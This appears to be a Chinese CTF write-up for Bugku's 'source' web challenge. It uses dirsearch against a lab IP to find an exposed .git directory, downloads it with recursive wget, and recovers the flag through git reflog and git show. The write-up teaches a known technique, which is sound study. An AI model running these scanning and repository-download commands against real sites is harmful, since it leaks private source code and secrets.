# Bugku CTF Web 题 source WriteUp

这道题的核心是利用 **Git 源码泄露**漏洞，通过恢复 Git 提交历史来获取隐藏的 flag。题目提示“我哥说渗透我只用linux环境”，所以我们需要在 Linux 环境下完成操作。

---

## 解题步骤

### 1. 初步信息收集

- 访问题目 URL，页面无有效信息，查看网页源码会发现一个假 flag，提交后会提示错误。

- 使用目录扫描工具（如 `dirsearch` 或 `gobuster`）扫描网站目录：

    ```Bash
    
    dirsearch -u http://171.80.2.169:16053/ -x 403
    ```

    扫描结果会发现存在 `.git` 目录，这是 Git 源码泄露的关键线索。

### 2. 下载 Git 仓库

在 Linux 环境（如 Kali）中，使用 `wget` 递归下载整个 `.git` 目录：

```Bash

wget -r http://171.80.2.169:16053/.git/
```

- `-r` 参数表示递归下载，会将 `.git` 目录下的所有文件完整下载到本地。

### 3. 恢复 Git 提交历史

进入下载后的目录，执行以下命令查看 Git 引用日志：

```Bash

git reflog
```

该命令会列出所有的 Git 提交记录，包括被删除或覆盖的提交。

### 4. 查找隐藏的 flag

逐一查看每个提交的内容，使用 `git show <commit-id>` 或 `git show HEAD@{n}` 命令。例如：

```Bash

git show 40c6d51
```

或

```Bash

git show HEAD@{4}
```

在其中一个提交中，你会找到真正的 flag。

---

## 关键命令总结

|命令|作用|
|---|---|
|`wget -r http://xxx/.git/`|递归下载 Git 仓库|
|`git reflog`|查看 Git 引用日志|
|`git show <commit-id>`|查看指定提交的内容|
> （注：文档部分内容可能由 AI 生成）